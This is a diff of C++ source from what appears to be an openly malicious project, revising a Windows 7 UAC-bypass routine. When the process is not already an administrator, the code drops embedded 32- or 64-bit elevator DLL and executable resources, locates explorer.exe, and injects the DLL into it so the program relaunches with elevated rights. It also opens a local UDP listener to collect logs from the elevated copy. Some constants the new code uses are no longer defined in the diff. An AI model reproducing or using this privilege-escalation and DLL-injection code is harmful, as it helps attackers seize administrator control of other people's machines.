@@ -6,70 +6,120 @@
 #include <system/ProcessManager.hpp>
 #include <system/File.hpp>
 #include <system/Uac.hpp>
+#include <blaspheme/Blaspheme.hpp>
 using namespace System;
 using namespace Malicious;
 
 #include <string>
 using namespace std;
 
-// DLL de privilege escalation
-#include <ElevatorDll.hpp>
-// Programme de privilege escalation
-#include <Elevator.hpp>
+#include <ElevatorDll32.hpp>
+#include <ElevatorDll64.hpp>
+#include <Elevator32.hpp>
+#include <Elevator64.hpp>
 
-int main(int argc, char * argv[])
+DWORD WINAPI MsgLoop(LPVOID lpParameter)
+{
+	Network::UdpSocket server;
+	server.listen(8000);
+	Network::Timeout deadline(0, 100);
+	std::string buffer;
+	while(true)
+	{
+		server.recv(buffer, deadline);
+		if(buffer.size())
+		{
+			LOG << buffer;
+		}
+	}
+	return 0;
+}
+
+int main()
 {
 	try
 	{
-        LOG.setHeader("TEST ELEVATION");
-        LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 80));
+		DWORD dwThread = 0;
+		HANDLE hThread = 0;
+		if(isAdministrator())
+		{
+			LOG.setHeader("FROM ELEVATED PROCESS");
+			LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 8000));
+			LOG << "Vous etes administrateur !";
+			return EXIT_SUCCESS;
+		}
+		else
+		{
+			LOG.setHeader("ELEVATION");
+			LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 80));
+			LOG.addObserver(new Common::LoggingMessage);
+			LOG << "Vous n'etes pas administrateur !";
+			hThread = CreateThread(0, 0,(LPTHREAD_START_ROUTINE)MsgLoop, 0, 0, &dwThread);
+		}
+
         switch(getSystemVersion())
 	    {
 		    case OS_WIN32_WINDOWS_VISTA:
 			    if(isUacActivated())
 			    {
-				    if(!isAdministrator())
-				    {
-					    LOG << "Elevation non supportee sur Windows Vista.";
-				    }
+					LOG << "Elevation non supportee sur Windows Vista.";
+					return EXIT_FAILURE;
 			    }
 			    break;
 		    case OS_WIN32_WINDOWS_SEVEN:
 			    if(isUacActivated())
 			    {
-				    if(!isAdministrator())
-				    {
-					    LOG << "Vous n'etes pas administrateur. Tentative d'elevation.";
-    					const char * ELEVATOR_PROCESS_NAME = "explorer.exe";
-                        const char * ELEVATOR_DLL_NAME = "privilege.dll";
-                        const char * ELEVATOR_EXE_NAME = "privilege.exe";
-					    BinaryRessource elevatorDll(ElevatorDll, sizeof(ElevatorDll), ELEVATOR_DLL_NAME, true);
-					    BinaryRessource elevator(Elevator, sizeof(Elevator), ELEVATOR_EXE_NAME, true);
+					LOG << "Tentative d'escalade des privileges...";
+					BinaryRessource * elevatorDll = 0;
+					BinaryRessource * elevator = 0;
+					if(is64BitWindows())
+					{
+						LOG << "Windows 64bit detected";
+						elevatorDll = new BinaryRessource(ElevatorDll64, sizeof(ElevatorDll64), ELEVATOR_DLL_NAME, true);
+						elevator = new BinaryRessource(Elevator64, sizeof(Elevator64), ELEVATOR_EXE_NAME, true);
+					}
+					else
+					{
+						LOG << "Windows 32bit detected";
+						elevatorDll = new BinaryRessource(ElevatorDll32, sizeof(ElevatorDll32), ELEVATOR_DLL_NAME, true);
+						elevator = new BinaryRessource(Elevator32, sizeof(Elevator32), ELEVATOR_EXE_NAME, true);
+					}
+
+					LOG << "Decouverte du PID d'explorer.exe";
+					DWORD explorer_pid = System::ProcessManager::GetPidFromName(ELEVATOR_PROCESS_NAME);
+					if(explorer_pid)
+					{
+						LOG << "Injection de la DLL d'elevation dans explorer.exe : " + to_string(explorer_pid);
+					}
+					else
+					{
+						FATAL_ERROR("explorer.exe ne peut pas etre injecte. Le processus n'existe pas.");
+					}
     					
-					    LOG << "Decouverte du PID d'explorer.exe";
-					    DWORD explorer_pid = System::ProcessManager::GetPidFromName(ELEVATOR_PROCESS_NAME);
-					    if(explorer_pid)
-					    {
-						    LOG << "Injection de la DLL d'elevation dans explorer.exe : " + to_string(explorer_pid);
-					    }
-					    else
-					    {
-						    FATAL_ERROR("explorer.exe ne peut pas etre injecte. Le processus n'existe pas.");
-					    }
+                    ThisProcess thisProcess;
+                    string currentPath = thisProcess.getProgramDir();
+					LOG << "Repertoire courant : "+currentPath;
+                    string elevatorArguments = currentPath+"\\"+string(ELEVATOR_PROCESS_NAME) + " " + to_string(explorer_pid) + " " + currentPath+"\\"+string(ELEVATOR_DLL_NAME) + " " + thisProcess.getProgramPath();
+					LOG << "Ligne de commande d'elevation " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;
     					
-                        ThisProcess thisProcess;
-                        string currentPath = thisProcess.getArg(0);
-                        System::GetFileDir(currentPath);
-                        string elevatorArguments = currentPath+"\\"+string(ELEVATOR_PROCESS_NAME) + " " + to_string(explorer_pid) + " " + currentPath+"\\"+string(ELEVATOR_DLL_NAME) + " " + thisProcess.getArg(0);
-					    LOG << "Ligne de commande d'elevation " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;
-    					
-					    Process elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
-					    elevatorProcess.wait();				
-				    }
+					Process elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
+					LOG << "Waiting elevator to finish...";
+					DWORD exitCode = elevatorProcess.wait();
+					LOG << "Exit code of elevated process : "+to_string(exitCode);
+
+					delete elevatorDll;
+					delete elevator;
 			    }
-		    default:
-			    LOG << "Vous etes administrateur!";
+				break;
+			default:
+				LOG << "Systeme non pris en charge...";
+				return EXIT_FAILURE;
         }
+
+		if(hThread != 0 && !TerminateThread(hThread, 0))
+		{
+			LOG << "Echec TerminateThread : " + to_string(GetLastError());
+		}
     }
     catch(std::exception& e)
     {
